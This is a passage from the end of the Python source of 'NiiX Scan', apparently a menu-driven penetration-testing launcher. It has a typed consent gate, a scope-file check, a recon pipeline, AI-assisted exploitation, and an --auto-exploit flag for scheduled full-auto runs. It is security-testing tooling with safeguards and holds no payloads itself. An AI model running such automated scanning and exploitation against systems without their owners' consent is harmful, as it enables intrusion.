    print(f"\n{RD}{'─'*w}{R}")
    print(f"{RD}{B}  ⚠  LEGAL AUTHORIZATION REQUIRED{R}")
    print(f"{RD}{'─'*w}{R}\n")
    lines = [
        "This tool performs active security testing including port scanning,",
        "vulnerability detection, and exploitation framework integration.",
        "",
        "USE ONLY AGAINST:",
        "  • Systems you own outright",
        "  • Systems you have explicit WRITTEN permission to test",
        "  • Dedicated lab/CTF environments",
        "",
        "Unauthorised use is a criminal offence in most jurisdictions.",
    ]
    for l in lines: print(f"  {l}")
    print(f"\n{RD}{'─'*w}{R}\n")

    target = ask("Enter the target you are authorised to test", "")
    if not target: msg_err("No target entered."); return False

    print(f"\n  Type exactly  {YL}I HAVE PERMISSION{R}  to confirm authorization:\n")
    ans = input(f"  {CY}»{R} ").strip()
    if ans != "I HAVE PERMISSION":
        msg_err("Authorization not confirmed. Exiting."); return False

    SESSION["authorized"] = True
    SESSION["target"]     = target
    msg_ok(f"Session authorized for target: {CY}{target}{R}")
    time.sleep(0.8)
    return True

# ══════════════════════════════════════════════════════════════════════════════
#  TOOL SUB-MENU
# ══════════════════════════════════════════════════════════════════════════════
def tool_submenu(tool):
    while True:
        banner()
        inst = tool.is_installed()
        st   = f"{GR}installed{R}" if inst else f"{RD}not installed{R}"
        print(f"\n  {tool.color}{B}[ {tool.label} ]{R}")
        print(f"  {DIM}{tool.desc}{R}   Status: {st}\n")
        print(f"  {CY}1{R}) ▶  Run")
        print(f"  {CY}2{R}) ⬇  Install / update")
        print(f"  {CY}0{R}) ←  Back\n")
        ch = input(f"  {CY}»{R} ").strip()
        if ch == "1":
            if not SESSION["authorized"]:
                if not authorization_gate(): pause(); return
            if not inst:
                msg_wrn("Not installed. Installing first …")
                install_single(tool)
            if tool.is_installed():
                tool.run_interactive()
            else:
                msg_err("Install failed. Cannot run."); pause()
        elif ch == "2": install_single(tool)
        elif ch == "0": break

# ══════════════════════════════════════════════════════════════════════════════
#  MAIN MENU
# ══════════════════════════════════════════════════════════════════════════════
def main_menu():
    # Load saved API key on startup
    cfg = load_cfg()
    if cfg.get("api_key") and not SESSION["api_key"]:
        SESSION["api_key"] = cfg["api_key"]

    while True:
        banner()
        w = _W()
        print(f"\n{CY}{'  MAIN MENU':^{w}}{R}\n")
        for i, tool in enumerate(TOOLS, 1):
            dot = f"{GR}●{R}" if tool.is_installed() else f"{RD}○{R}"
            print(f"  {CY}{i:>2}{R})  {dot}  {B}{tool.label:<44}{R} {DIM}{tool.desc}{R}")
        print()
        print(f"  {PU}{B} A{R})  🤖  AI Analysis & Exploitation Centre")
        print(f"  {GR}{B} P{R})  🔄  Auto Recon Pipeline  {DIM}(subfinder→httpx→nmap→nuclei→gobuster){R}")
        print(f"  {RD}{B} F{R})  ⚡  FULL AUTO  {DIM}(pipeline + AI triage + reports){R}")
        print(f"  {BL}{B} V{R})  🗄   Findings Database  {DIM}(hosts/ports/vulns/creds){R}")
        print(f"  {WH}{B} D{R})  🛡   Detection Validation  {DIM}(purple team: test YOUR monitoring){R}")
        print(f"  {CY}{B} R{R})  ↩   Restore saved session")
        print(f"  {OR}{B} C{R})  ⏰   Schedule auto scans (cron)")
        print(f"  {YL} I{R})  ⬇  Install ALL tools")
        print(f"  {MG} S{R})  ⚙  Settings  {DIM}(key, model, preset, proxy, scope){R}")
        print(f"  {RD} Q{R})  ✕  Quit")
        print(f"\n{hline()}")
        ch = input(f"\n  {CY}Select option{R}: ").strip().lower()

        if ch.isdigit():
            n = int(ch)
            if 1 <= n <= len(TOOLS):
                tool_submenu(TOOLS[n-1])
            else:
                msg_err("Invalid option."); time.sleep(0.4)
        elif ch == "a":
            if not SESSION["authorized"]:
                if not authorization_gate(): continue
            ai_analysis_menu()
        elif ch == "p":
            if not SESSION["authorized"]:
                if not authorization_gate(): continue
            t = ask("Pipeline target", SESSION["target"] or "")
            if t: recon_pipeline(t)
        elif ch == "f":
            if not SESSION["authorized"]:
                if not authorization_gate(): continue
            t = ask("Full-auto target", SESSION["target"] or "")
            if t: full_auto(t)
        elif ch == "v":  findings_viewer()
        elif ch == "d":
            if not SESSION["authorized"]:
                if not authorization_gate(): continue
            t = ask("Your own system to test (IP/host, localhost recommended)",
                    SESSION["target"] or "127.0.0.1")
            if t: detection_validation(t)
        elif ch == "r":  restore_checkpoint(); pause()
        elif ch == "c":  schedule_menu()
        elif ch == "i":  install_all()
        elif ch == "s":  settings_menu()
        elif ch in ("q","quit","exit"):
            banner()
            print(f"\n  {CY}Thank you for using NiiX Scan. Stay ethical.{R}\n")
            sys.exit(0)
        else:
            msg_err("Invalid option."); time.sleep(0.4)

# ══════════════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ══════════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    if sys.version_info < (3, 8):
        sys.exit("NiiX Scan requires Python 3.8+")
    if "--install-all" in sys.argv:
        install_all(); sys.exit(0)
    if "--auto" in sys.argv:
        # Non-interactive full-auto mode (used by cron and scripts).
        # --i-have-permission pre-answers the consent gate: only ever use it
        # for targets you are authorised to test; the scope file is still enforced.
        try:
            t = sys.argv[sys.argv.index("--auto") + 1]
        except IndexError:
            sys.exit("Usage: niixscan.py --auto <target> [--i-have-permission]")
        if "--i-have-permission" in sys.argv:
            if not check_scope(t):
                sys.exit(f"Refused: {t} is not covered by your scope file "
                         f"({_SCOPE_FILE}).")
            SESSION["authorized"] = True
        elif not authorization_gate():
            sys.exit(1)
        cfg = load_cfg()
        SESSION["api_key"] = SESSION["api_key"] or cfg.get("api_key", "")
        if "--auto-exploit" in sys.argv:
            cfg["auto_exploit"] = True   # explicit CLI opt-in for this run
            save_cfg(cfg)
        full_auto(t)
        sys.exit(0)
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n\n  {YL}Interrupted.{R}\n"); sys.exit(0)
    except EOFError:
        print(f"\n\n  {CY}Goodbye.{R}\n"); sys.exit(0)
